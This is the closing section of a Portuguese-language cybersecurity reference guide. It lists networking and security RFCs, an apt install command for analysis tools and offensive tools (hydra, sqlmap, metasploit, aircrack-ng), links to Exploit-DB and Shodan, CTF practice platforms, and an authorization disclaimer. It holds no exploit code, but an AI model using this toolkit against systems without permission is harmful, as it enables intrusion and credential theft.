- **RFC 5681** - TCP Congestion Control
- **RFC 6298** - TCP Retransmission Timer

#### Camada de Aplicação
- **RFC 1034/1035** - Domain Name System (DNS)
- **RFC 2616** - HTTP/1.1 (obsoleted by RFC 7230-7235)
- **RFC 7230-7235** - HTTP/1.1
- **RFC 7540** - HTTP/2
- **RFC 9114** - HTTP/3
- **RFC 2818** - HTTP Over TLS
- **RFC 4250-4256** - Secure Shell (SSH) Protocol
- **RFC 5321** - Simple Mail Transfer Protocol (SMTP)
- **RFC 3501** - Internet Message Access Protocol (IMAP)

#### Segurança
- **RFC 5246** - Transport Layer Security (TLS) 1.2
- **RFC 8446** - Transport Layer Security (TLS) 1.3
- **RFC 4033/4034/4035** - DNS Security Extensions (DNSSEC)
- **RFC 4301** - Security Architecture for the Internet Protocol (IPsec)
- **RFC 6749** - OAuth 2.0 Authorization Framework

### Ferramentas Essenciais

```bash
# Instalação (Debian/Ubuntu)
sudo apt install -y \
    tcpdump wireshark tshark nmap netcat-openbsd \
    dnsutils bind9-dnsutils iputils-ping net-tools iproute2 \
    ethtool iftop nethogs iptraf-ng vnstat \
    hping3 ngrep arp-scan arping \
    openssh-client openssh-server \
    openssl gnutls-bin \
    curl wget netcat socat \
    hydra medusa ncrack \
    nikto sqlmap wfuzz gobuster \
    aircrack-ng kismet \
    metasploit-framework
```

### Recursos Online

- **Exploit-DB**: https://www.exploit-db.com/
- **CVE Details**: https://www.cvedetails.com/
- **OWASP**: https://owasp.org/
- **Sans Reading Room**: https://www.sans.org/reading-room/
- **Wireshark Wiki**: https://wiki.wireshark.org/
- **RFC Editor**: https://www.rfc-editor.org/
- **PacketLife Cheat Sheets**: https://packetlife.net/library/cheat-sheets/
- **Shodan**: https://www.shodan.io/
- **VirusTotal**: https://www.virustotal.com/

### CTFs e Labs para Prática

- **HackTheBox**: https://www.hackthebox.com/
- **TryHackMe**: https://tryhackme.com/
- **PentesterLab**: https://pentesterlab.com/
- **OverTheWire**: https://overthewire.org/
- **PicoCTF**: https://picoctf.org/
- **VulnHub**: https://www.vulnhub.com/
- **DVWA**: Damn Vulnerable Web Application
- **Metasploitable**: VM propositalmente vulnerável

---

**Autor**: Guia Técnico de Referência para CyberSecurity  
**Última Atualização**: 2025  
**Licença**: Open Source

**Aviso**: Este documento é para fins educacionais e de pesquisa em segurança. O uso indevido de técnicas e ferramentas aqui descritas pode ser ilegal. Sempre obtenha autorização explícita antes de testar sistemas que não sejam seus.

